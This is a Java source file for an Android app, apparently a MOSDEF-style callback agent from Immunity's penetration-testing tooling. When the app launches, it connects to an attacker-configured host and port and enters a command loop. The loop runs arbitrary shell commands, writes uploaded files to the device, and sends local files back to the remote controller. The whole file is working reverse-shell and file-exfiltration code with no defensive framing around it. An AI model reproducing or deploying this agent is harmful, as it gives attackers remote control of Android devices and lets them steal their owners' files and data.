package d2.android.mosdef;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import android.content.pm.ApplicationInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.Context;
import android.content.BroadcastReceiver;
import android.content.Intent;
import java.lang.Integer;
import java.io.*;
import java.net.*;

public class Mosdef extends Activity
{
	public Socket sock = null;
	public DataInputStream input = null;
	public DataOutputStream output = null;

  @Override
  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    String host = null;
    int port = 0;

    try {
      ApplicationInfo ai = getPackageManager().getApplicationInfo(this.getPackageName(), PackageManager.GET_META_DATA);
      host = (String) ai.metaData.getString("mosdefip");
      port = (Integer) ai.metaData.getInt("mosdefport");
    } catch(NameNotFoundException e) {
      //e.printStackTrace();;
      return;
    }

    //System.out.println(host);
    //System.out.println(port);
    //System.out.println(fakemsg);

    try {
      this.sock = new Socket(host, port);
      this.input = new DataInputStream(this.sock.getInputStream());
      this.output = new DataOutputStream(this.sock.getOutputStream());
      mainloop();
    } catch(IOException e) {
      //e.printStackTrace();
    }
  }

  // Immunity code
  public void sendresult(String stringdata) throws IOException {
    //now send data back out
    byte[] data;
    data = stringdata.getBytes();
    sendresult(data);
  }

  public void sendresult(byte[] data) throws IOException {
    this.output.writeInt(data.length);
    this.output.write(data, 0, data.length);
  }

	public void mainloop() {
    byte[] data = null;
    byte[] outdata = null;
    int done = 0;
    int length;
    int comtype;
    String outstring;

    try {
      while (done != 1) {
        length = this.input.readInt();
        //read length
        comtype = this.input.readInt();
        //read command type
        data = new byte[length];
        //allocate some space
        if (length > 0x00100000) {
          //check to see if our size is completely muddled
          done = 1;
          continue;
        }
        this.input.readFully(data, 0, length);
        //read data block
        if (comtype == 1) {
          //getcwd
          // System.out.println("getcwd called");
          outstring = getcwd();
          sendresult(outstring);
        } else if (comtype == 2) {
          //chdir
          // System.out.println("cd to " + new String(data));
          cd(new String(data));
        } else if (comtype == 3) {
          //runcommand
          // System.out.println("Runcommand " + new String(data));
          outstring = runcommand(new String(data));
          sendresult(outstring);
        } else if (comtype == 4) {
          //upload
          // System.out.println("Upload");
          //upload block is:
          //<size >< 0 0 0 4 >< length of name of file in big endian order >< name of file >< file data >
          DataInputStream body = new DataInputStream(new ByteArrayInputStream(data));
          int filenameLength = body.readInt();
          byte[] filenameBytes = new byte[filenameLength];
          body.readFully(filenameBytes);
          String filename = new String(filenameBytes);
          byte[] filedata = new byte[length - 4 - filenameBytes.length];
          body.readFully(filedata);
          savefile(filename, filedata);
        } else if (comtype == 5) {
          //download arguments are just a filename
          // System.out.println("Download " + data);
          String filename = new String(data);
          byte[] filedata = getfiledata(filename);
          sendresult(filedata);
          //send it out
        }
      }
    } catch(IOException e) {
      done = 1;
    }
  }

	public String getcwd() {
    //get 's current working directory
    // getBytes might need to specify a char to bytes converter !
    return System.getProperty("user.dir");
  }

  public void cd(String newdir) {
    //this changes the current working directory of our process
    System.setProperty("user.dir", newdir);
  }

  public byte[] getfiledata(String filename) throws IOException {
    //read a file from the filesystem
    FileInputStream input = new FileInputStream(filename);
    byte[] barray = new byte[input.available()];
    //allocate the exact space we need
    input.read(barray);
    //read the data from the file into our array
    return barray;
  }

  public void savefile(String filename, byte[] filedata) throws IOException {
    //save a file to the file system
    // open the file
    FileOutputStream out = new FileOutputStream(filename);
    //write the data
    out.write(filedata);
    out.close();
  }

	public String runcommand(String command) {
		//Runs a single command and returns the output
		// Returns an empty string if it failed
    String str = null, out_str = "";
    try {
      Process p = Runtime.getRuntime().exec(command);
      BufferedReader  buf = new BufferedReader(new InputStreamReader(p.getInputStream()));
      while ((str = buf.readLine()) != null) {
        out_str = out_str + str + "\n";
      } //end while loop
    } catch(IOException e) {
      //e.printStackTrace();
    } //End try / catch
    return out_str;
  } //end runcommand
}
